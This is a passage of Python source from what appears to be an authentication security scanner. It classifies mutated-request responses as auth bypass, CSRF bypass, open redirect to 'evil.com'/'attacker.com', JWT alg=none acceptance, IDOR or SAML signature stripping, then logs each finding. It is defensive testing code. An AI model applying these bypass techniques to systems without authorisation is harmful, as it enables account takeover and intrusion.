                                  f"Request succeeded without authentication (HTTP {new_status}). "
                                  f"Endpoint may not enforce authentication.",
                                  original.get('url', ''))

        # CSRF bypass
        if mutation_name in ('oauth_remove_state', 'remove_csrf', 'fba_remove_csrf'):
            if new_status in (200, 302, 303) and original_status in (200, 302, 303):
                self._report_vuln(mutation_name, "csrf_bypass",
                                  "high", sequence,
                                  "Request accepted without CSRF/state protection.",
                                  original.get('url', ''))

        # Open redirect
        if mutation_name == 'oauth_modify_redirect_uri':
            if new_status in (302, 303):
                location = ''
                if hasattr(response, 'headers'):
                    location = (response.headers or {}).get('Location', '')
                if 'evil.com' in location or 'attacker.com' in location:
                    self._report_vuln(mutation_name, "open_redirect",
                                      "high", sequence,
                                      f"Redirect to attacker-controlled URI accepted: {location}",
                                      original.get('url', ''))

        # JWT alg=none accepted
        if mutation_name == 'jwt_alg_none' and new_status == 200:
            self._report_vuln(mutation_name, "jwt_alg_none_bypass",
                              "critical", sequence,
                              "Server accepted JWT with alg=none (no signature verification).",
                              original.get('url', ''))

        # Privilege escalation
        if mutation_name == 'privilege_escalation' and new_status == 200:
            if original_status == 200:
                self._report_vuln(mutation_name, "privilege_escalation",
                                  "high", sequence,
                                  "Endpoint accepted modified user ID — possible IDOR/privilege escalation.",
                                  original.get('url', ''))

        # SAML signature stripping
        if mutation_name == 'saml_signature_strip' and new_status == 200:
            self._report_vuln(mutation_name, "saml_signature_bypass",
                              "critical", sequence,
                              "SAML assertion accepted without valid signature.",
                              original.get('url', ''))

    def _report_vuln(self, mutation: str, vuln_type: str, severity: str,
                     sequence: int, description: str, url: str):
        """Report a discovered vulnerability."""
        vuln = {
            'type': vuln_type,
            'severity': severity,
            'mutation': mutation,
            'sequence': sequence,
            'description': description,
            'url': url,
            'timestamp': time.time(),
        }
        self.results['vulnerabilities'].append(vuln)
        self.vulnerability_found.emit(self.test_id, vuln)
